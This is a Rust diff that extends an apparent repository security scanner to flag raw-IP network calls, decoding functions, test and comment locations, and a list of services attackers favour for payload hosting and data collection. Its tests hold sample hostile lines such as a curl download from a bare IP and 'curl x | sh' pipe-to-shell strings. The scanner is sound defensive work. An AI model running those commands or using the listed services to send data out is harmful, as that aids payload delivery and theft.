@@ -6,7 +6,8 @@
 //! calls with no visible address get their own section in the report.
 
 use crate::git::RepoFile;
-use crate::report::{At, Call, Kind, Report};
+pub(crate) use crate::report::Call;
+use crate::report::{At, Kind, Report};
 use crate::text::Untrusted;
 use regex::bytes::Regex;
 use std::net::{Ipv4Addr, Ipv6Addr};
@@ -51,11 +52,29 @@ const CALL_PATTERN: &str = r#"(?xi-u)
       | certutil\s+-urlcache
       | new\s+(?:http|web)client
       | urlsession
+      | request\.(?:get|post|put)\s*\(
+      | superagent\.(?:get|post|put)\s*\(
+      | needle\s*\(\s*['"](?:get|post)
+      | undici\.(?:fetch|request)\s*\(
+      | urllib3?\.\w*(?:urlopen|request)\s*\(
+      | aiohttp\.
+      | http\.client\.
+      | dns\.(?:resolve\w*|lookup)\s*\(
+      | new\s+net\.socket
+      | dgram\.createsocket\s*\(
+      | socket\.socket\s*\(
+      | tcpclient\s*\(
+      | fsockopen\s*\(
+      | file_get_contents\s*\(\s*["']https?:
+      | new\s+url\s*\([^)\n]{1,200}\)\.open
+      | httparty\.(?:get|post)
+      | faraday\.(?:get|post|new)
+      | nslookup\s+[-\w$"']
     )
 "#;
 
 /// Code that turns hidden text back into something readable.
-const DECODE_PATTERN: &str = r"(?xi-u)
+const DECODE_PATTERN: &str = r#"(?xi-u)
     \batob\s*\(
   | \bbuffer\.from\s*\([^)\n]{0,200}(?:base64|hex)
   | \bb64decode\b
@@ -71,7 +90,18 @@ const DECODE_PATTERN: &str = r"(?xi-u)
   | \bstr_rot13\s*\(
   | \bbase64\s+(?:-d|-D|--decode)\b
   | \bxxd\s+-r\b
-";
+  | \bdecode64\b
+  | \bbase64\.(?:decode|urldecode|urlsafe_decode)\b
+  | \b(?:b32|b85|a85|urlsafe_b64|standard_b64)decode\b
+  | \bbinascii\.(?:unhexlify|a2b_base64)\b
+  | \bmarshal\.loads\b
+  | \brot13\b
+  | \bpack\s*\(\s*["']H
+  | \bunpack\s*\(\s*["'][mu]
+  | \bopenssl\s+(?:enc|base64)\b[^\n]{0,40}\s-d\b
+  | \bcertutil(?:\.exe)?\s+-decode\b
+  | \b__import__\s*\(\s*["'](?:base64|zlib|codecs|marshal|binascii|bz2|lzma)["']\s*\)
+"#;
 
 pub(crate) static URL: LazyLock<Regex> = LazyLock::new(|| compile(URL_PATTERN));
 static IPV4: LazyLock<Regex> = LazyLock::new(|| compile(IPV4_PATTERN));
@@ -98,6 +128,108 @@ const CLOUD_METADATA_HOSTS: [&str; 3] = [
     "169.254.169.254",
     "metadata.google.internal",
     "[fd00:ec2::254]",
+];
+
+/// Public DNS services, which programs contact by IP address for honest reasons.
+const WELL_KNOWN_IPS: [&str; 8] = [
+    "1.1.1.1",
+    "1.0.0.1",
+    "8.8.8.8",
+    "8.8.4.4",
+    "9.9.9.9",
+    "149.112.112.112",
+    "208.67.222.222",
+    "208.67.220.220",
+];
+
+const STORES_FILES: &str = "Stores text or files for anyone to download";
+const COLLECTS_DATA: &str = "Collects whatever is sent to it";
+const TUNNELS: &str = "Tunnels to someone's own computer";
+const SHORT_LINKS: &str = "Hides the real address behind a short link";
+const SHOWS_IP: &str = "Reveals this computer's public address";
+const CHAT: &str = "Chat services that can receive messages from code";
+const TOR: &str = "Tor hidden services";
+
+/// Services that are useful to anyone, and especially to attackers, who use them
+/// to keep the real payload out of the repository or to receive what they steal.
+const RISKY_HOSTS: [(&str, &str); 44] = [
+    ("api.npoint.io", STORES_FILES),
+    ("jsonkeeper.com", STORES_FILES),
+    ("jsonbin.io", STORES_FILES),
+    ("pastebin.com", STORES_FILES),
+    ("paste.ee", STORES_FILES),
+    ("hastebin.com", STORES_FILES),
+    ("rentry.co", STORES_FILES),
+    ("dpaste.com", STORES_FILES),
+    ("transfer.sh", STORES_FILES),
+    ("file.io", STORES_FILES),
+    ("0x0.st", STORES_FILES),
+    ("temp.sh", STORES_FILES),
+    ("catbox.moe", STORES_FILES),
+    ("gofile.io", STORES_FILES),
+    ("bashupload.com", STORES_FILES),
+    ("webhook.site", COLLECTS_DATA),
+    ("requestbin.com", COLLECTS_DATA),
+    ("requestcatcher.com", COLLECTS_DATA),
+    ("pipedream.net", COLLECTS_DATA),
+    ("interact.sh", COLLECTS_DATA),
+    ("oast.fun", COLLECTS_DATA),
+    ("oast.pro", COLLECTS_DATA),
+    ("oast.live", COLLECTS_DATA),
+    ("burpcollaborator.net", COLLECTS_DATA),
+    ("dnslog.cn", COLLECTS_DATA),
+    ("ngrok.io", TUNNELS),
+    ("ngrok-free.app", TUNNELS),
+    ("trycloudflare.com", TUNNELS),
+    ("serveo.net", TUNNELS),
+    ("loca.lt", TUNNELS),
+    ("bit.ly", SHORT_LINKS),
+    ("tinyurl.com", SHORT_LINKS),
+    ("t.ly", SHORT_LINKS),
+    ("is.gd", SHORT_LINKS),
+    ("rb.gy", SHORT_LINKS),
+    ("cutt.ly", SHORT_LINKS),
+    ("shorturl.at", SHORT_LINKS),
+    ("ipinfo.io", SHOWS_IP),
+    ("ip-api.com", SHOWS_IP),
+    ("ipify.org", SHOWS_IP),
+    ("checkip.amazonaws.com", SHOWS_IP),
+    ("icanhazip.com", SHOWS_IP),
+    ("ifconfig.me", SHOWS_IP),
+    ("ipapi.co", SHOWS_IP),
+];
+/// For these only one part of the service is risky, so the path counts too.
+const RISKY_ADDRESSES: [(&str, &str); 4] = [
+    ("discord.com/api/webhooks", CHAT),
+    ("discordapp.com/api/webhooks", CHAT),
+    ("cdn.discordapp.com/attachments", STORES_FILES),
+    ("api.telegram.org/bot", CHAT),
+];
+
+const TEST_FOLDERS: [&str; 14] = [
+    "test",
+    "tests",
+    "testing",
+    "testdata",
+    "test-data",
+    "test_data",
+    "__tests__",
+    "__fixtures__",
+    "__snapshots__",
+    "__mocks__",
+    "fixtures",
+    "fixture",
+    "spec",
+    "e2e",
+];
+const SCRIPT_EXTENSIONS: [&str; 22] = [
+    "js", "mjs", "cjs", "ts", "mts", "cts", "jsx", "tsx", "vue", "svelte", "html", "htm", "py",
+    "rb", "php", "sh", "bash", "zsh", "ps1", "bat", "cmd", "pl",
+];
+const TEST_NAME_MARKS: [&str; 5] = ["_test.", ".test.", ".spec.", "_spec.", "-test."];
+/// In these, `#` starts private names and such rather than a comment.
+const SCRIPT_EXTENSIONS_WITHOUT_HASH_COMMENTS: [&str; 10] = [
+    "js", "mjs", "cjs", "ts", "mts", "cts", "jsx", "tsx", "vue", "svelte",
 ];
 
 const LOCKFILES: [&str; 14] = [
@@ -192,10 +324,40 @@ fn scan_urls(file: &RepoFile, class: FileClass, binary: bool, report: &mut Repor
             host.as_str()
         };
         report.add(kind, group, &url, at);
-        if kind == Kind::NetworkCall {
+        if matches!(kind, Kind::NetworkCall | Kind::CallsRawIp) {
             remember_call(file, group, &url, line, report);
         }
+        if class == FileClass::Code {
+            if let Some(service) = risky_service(&host, &url) {
+                report.add(Kind::RiskyHost, service, &url, at);
+            }
+        }
     }
+}
+
+/// What kind of risky service an address belongs to, if any.
+fn risky_service(host: &str, url: &str) -> Option<&'static str> {
+    if host.ends_with(".onion") {
+        return Some(TOR);
+    }
+    let on_host = |known: &str| {
+        host == known
+            || host
+                .strip_suffix(known)
+                .is_some_and(|rest| rest.ends_with('.'))
+    };
+    let address = url.split_once("://").map_or(url, |(_, rest)| rest);
+    let address = address.to_ascii_lowercase();
+
+    RISKY_HOSTS
+        .iter()
+        .find(|(known, _)| on_host(known))
+        .or_else(|| {
+            RISKY_ADDRESSES
+                .iter()
+                .find(|(known, _)| address.starts_with(known))
+        })
+        .map(|(_, service)| *service)
 }
 
 fn remember_call(
@@ -239,7 +401,7 @@ fn scan_ips(file: &RepoFile, class: FileClass, binary: bool, report: &mut Report
                 line,
             }),
         );
-        if kind == Kind::NetworkCall {
+        if matches!(kind, Kind::NetworkCall | Kind::CallsRawIp) {
             remember_call(file, "", &text, line, report);
         }
     }
@@ -292,6 +454,7 @@ fn address_kind(class: FileClass, host: &str, near_call: bool) -> Kind {
         FileClass::Documentation => Kind::DocumentationAddress,
         FileClass::Lockfile => Kind::LockfileAddress,
         FileClass::Code | FileClass::RunsElsewhere if is_local(host) => Kind::LocalAddress,
+        FileClass::Code if near_call && is_unexplained_ip(host) => Kind::CallsRawIp,
         FileClass::Code | FileClass::RunsElsewhere if near_call => Kind::NetworkCall,
         FileClass::Code | FileClass::RunsElsewhere if is_ip(host) => Kind::IpAddress,
         FileClass::Code | FileClass::RunsElsewhere => Kind::MentionedAddress,
@@ -310,11 +473,10 @@ pub(crate) fn classify(path: &str) -> FileClass {
     let in_ci_folder = CI_FOLDERS
         .iter()
         .any(|folder| lower.starts_with(folder) || lower.contains(&format!("/{folder}")));
-    if in_ci_folder
-        || CI_FILES.contains(&name)
-        || name == "dockerfile"
+    let is_dockerfile = name == "dockerfile"
         || name.ends_with(".dockerfile")
-    {
+        || (name.starts_with("dockerfile.") && !is_script(name, b""));
+    if in_ci_folder || CI_FILES.contains(&name) || is_dockerfile {
         return FileClass::RunsElsewhere;
     }
     let document_extension = DOCUMENT_EXTENSIONS.iter().any(|ext| name.ends_with(ext));
@@ -326,6 +488,57 @@ pub(crate) fn classify(path: &str) -> FileClass {
     } else {
         FileClass::Code
     }
+}
+
+/// Whether a file is part of a project's tests. Tests of how code handles strange
+/// input are full of strange input, so some checks want stronger evidence here.
+/// Attackers can hide things in tests too, so this never excuses anything outright.
+pub(crate) fn is_test_path(path: &str) -> bool {
+    let lower = path.to_ascii_lowercase();
+    let mut pieces = lower.rsplit('/');
+    let name = pieces.next().unwrap_or(&lower);
+
+    // Folders like `app.tests.integration` count too.
+    pieces.any(|folder| folder.split('.').any(|part| TEST_FOLDERS.contains(&part)))
+        || TEST_NAME_MARKS.iter().any(|mark| name.contains(mark))
+        || name.starts_with("test_")
+}
+
+/// Whether a file is a program, as opposed to data or settings. Decoding, joining
+/// pieces of text and so on only mean something in a file that can do those things.
+pub(crate) fn is_script(path: &str, contents: &[u8]) -> bool {
+    let name = path.rsplit('/').next().unwrap_or(path).to_ascii_lowercase();
+    let extension = name.rsplit_once('.').map_or("", |(_, extension)| extension);
+
+    SCRIPT_EXTENSIONS.contains(&extension) || contents.starts_with(b"#!")
+}
+
+/// Whether the text at an offset sits in a comment, so it can't run.
+///
+/// This only looks at the start of the line, and is deliberately cautious, because
+/// an attacker can read this too. `${}` inside a JavaScript template string runs
+/// even on a line that starts with `//`, and `#` isn't a comment in JavaScript.
+pub(crate) fn is_in_comment(contents: &[u8], offset: usize, path: &str) -> bool {
+    let line_start = contents[..offset]
+        .iter()
+        .rposition(|byte| *byte == b'\n')
+        .map_or(0, |newline| newline + 1);
+    let before = contents[line_start..offset].trim_ascii_start();
+    if before.windows(2).any(|window| window == b"${") {
+        return false;
+    }
+
+    let extension = path.rsplit_once('.').map_or("", |(_, extension)| extension);
+    let extension = extension.to_ascii_lowercase();
+    let hash_is_comment = !SCRIPT_EXTENSIONS_WITHOUT_HASH_COMMENTS.contains(&extension.as_str());
+    let closes = |mark: &[u8]| before.windows(mark.len()).any(|window| window == mark);
+
+    before.starts_with(b"//")
+        || (before.starts_with(b"#") && !before.starts_with(b"#!") && hash_is_comment)
+        || (before.starts_with(b"/*") && !closes(b"*/"))
+        || (before.starts_with(b"<!--") && !closes(b"-->"))
+        || before.len() >= 4 && before[..4].eq_ignore_ascii_case(b"rem ")
+        || before.starts_with(b"::")
 }
 
 pub(crate) fn is_binary(contents: &[u8]) -> bool {
@@ -378,6 +591,12 @@ fn is_built_at_run_time(host: &str) -> bool {
     host.contains(['$', '{', '}', '%', '*'])
 }
 
+/// Code that really means to reach a service uses its name. An address alone
+/// can't be looked up or read, which is why hand-rolled malware servers use them.
+fn is_unexplained_ip(host: &str) -> bool {
+    is_ip(host) && !WELL_KNOWN_IPS.contains(&host) && !CLOUD_METADATA_HOSTS.contains(&host)
+}
+
 fn is_ip(host: &str) -> bool {
     host.parse::<Ipv4Addr>().is_ok() || parse_ipv6(host).is_some()
 }
@@ -388,7 +607,7 @@ fn parse_ipv6(host: &str) -> Option<Ipv6Addr> {
 
 /// Whether an address stays on the machine or local network, or can't be routed
 /// at all. Listed separately because it isn't an outside connection.
-fn is_local(host: &str) -> bool {
+pub(crate) fn is_local(host: &str) -> bool {
     if CLOUD_METADATA_HOSTS.contains(&host) {
         return false;
     }
@@ -787,6 +1006,7 @@ mod tests {
             "Jenkinsfile",
             "Dockerfile",
             "docker/app.dockerfile",
+            "docker/Dockerfile.linux",
         ] {
             assert_eq!(classify(path), FileClass::RunsElsewhere, "{path}");
 
@@ -1042,6 +1262,147 @@ mod tests {
         let report = scan_text("a.bin", b"\0\0fetch(x)\0");
 
         assert!(report.listed(Kind::CallWithoutAddress).is_empty());
+    }
+
+    #[test]
+    fn a_call_to_an_unexplained_ip_address_is_dangerous() {
+        for line in [
+            "axios.get('http://95.164.17.24:1224/client/x')",
+            "curl http://95.164.17.24/i.sh -o a",
+            "requests.post('http://[2001:4860::1]/x')",
+            "curl 95.164.17.24/x",
+        ] {
+            let report = scan_text("a.js", line.as_bytes());
+
+            assert_eq!(report.listed(Kind::CallsRawIp).len(), 1, "{line}");
+            assert!(report.has_calls("a.js"), "{line}");
+        }
+    }
+
+    #[test]
+    fn an_ip_address_alone_or_a_public_dns_service_is_not_called_dangerous() {
+        for line in [
+            "// see 95.164.17.24 for this",
+            "const a = 'http://95.164.17.24/x';",
+            "net.Dial(\"udp\", \"8.8.8.8:53\")",
+            "curl 1.1.1.1/x",
+            "fetch('http://127.0.0.1:3000/x')",
+        ] {
+            let report = scan_text("a.js", line.as_bytes());
+
+            assert!(report.listed(Kind::CallsRawIp).is_empty(), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_call_to_an_ip_address_in_ci_config_is_listed_but_not_dangerous() {
+        let report = scan_text(".github/workflows/a.yml", b"curl http://95.164.17.24/x\n");
+
+        assert!(report.listed(Kind::CallsRawIp).is_empty());
+        assert_eq!(report.listed(Kind::NetworkCall).len(), 1);
+    }
+
+    #[test]
+    fn lists_services_attackers_like_by_what_they_do() {
+        for (url, service) in [
+            ("https://api.npoint.io/abc", STORES_FILES),
+            ("https://pastebin.com/raw/abc", STORES_FILES),
+            ("https://webhook.site/abc", COLLECTS_DATA),
+            ("https://abc.ngrok-free.app/x", TUNNELS),
+            ("https://bit.ly/abc", SHORT_LINKS),
+            ("https://api.ipify.org/", SHOWS_IP),
+            ("https://discord.com/api/webhooks/1/abc", CHAT),
+            ("https://api.telegram.org/bot123/sendMessage", CHAT),
+            ("http://abcdefg.onion/x", TOR),
+        ] {
+            let report = scan_text("a.js", format!("x = '{url}'\n").as_bytes());
+
+            assert_eq!(
+                report.group_of(Kind::RiskyHost, url).as_deref(),
+                Some(service),
+                "{url}"
+            );
+        }
+    }
+
+    #[test]
+    fn names_that_only_resemble_those_services_are_not_listed() {
+        for url in [
+            "https://notbit.ly/abc",
+            "https://discord.com/invite/abc",
+            "https://api.telegram.org/file/x",
+            "https://pastebin.com.evil.net/x",
+        ] {
+            let report = scan_text("a.js", format!("x = '{url}'\n").as_bytes());
+
+            assert!(report.listed(Kind::RiskyHost).is_empty(), "{url}");
+        }
+    }
+
+    #[test]
+    fn those_services_in_documentation_are_not_singled_out() {
+        let report = scan_text("README.md", b"https://pastebin.com/abc\n");
+
+        assert!(report.listed(Kind::RiskyHost).is_empty());
+    }
+
+    #[test]
+    fn recognizes_test_files() {
+        for path in [
+            "test/a.js",
+            "src/tests/a.py",
+            "testdata/a.txt",
+            "a/__tests__/b.js",
+            "a_test.go",
+            "a.test.ts",
+            "a.spec.js",
+            "test_a.py",
+            "fixtures/a.js",
+            "src/app.tests.integration/a.js",
+        ] {
+            assert!(is_test_path(path), "{path}");
+        }
+        for path in ["src/a.js", "contest/a.js", "latest.js", "attest/a.py"] {
+            assert!(!is_test_path(path), "{path}");
+        }
+    }
+
+    #[test]
+    fn recognizes_comments() {
+        for (path, text) in [
+            ("a.js", "// curl x | sh"),
+            ("a.js", "  /* curl x | sh"),
+            ("a.sh", "# curl x | sh"),
+            ("a.py", "    # curl x | sh"),
+            ("a.bat", "REM curl x | sh"),
+            ("a.bat", ":: curl x | sh"),
+            ("a.html", "<!-- curl x | sh"),
+        ] {
+            let offset = text.find("curl").unwrap();
+
+            assert!(
+                is_in_comment(text.as_bytes(), offset, path),
+                "{path}: {text}"
+            );
+        }
+    }
+
+    #[test]
+    fn code_made_to_look_like_a_comment_still_counts() {
+        for (path, text) in [
+            ("a.sh", "curl x | sh # curl x | sh"),
+            ("a.js", "/* a */ curl x | sh"),
+            ("a.js", "#x = curl x | sh"),
+            ("a.js", "// ${curl x | sh}"),
+            ("a.html", "<!-- a --> curl x | sh"),
+        ] {
+            let offset = text.find("curl").unwrap();
+
+            assert!(
+                !is_in_comment(text.as_bytes(), offset, path),
+                "{path}: {text}"
+            );
+        }
     }
 
     #[test]
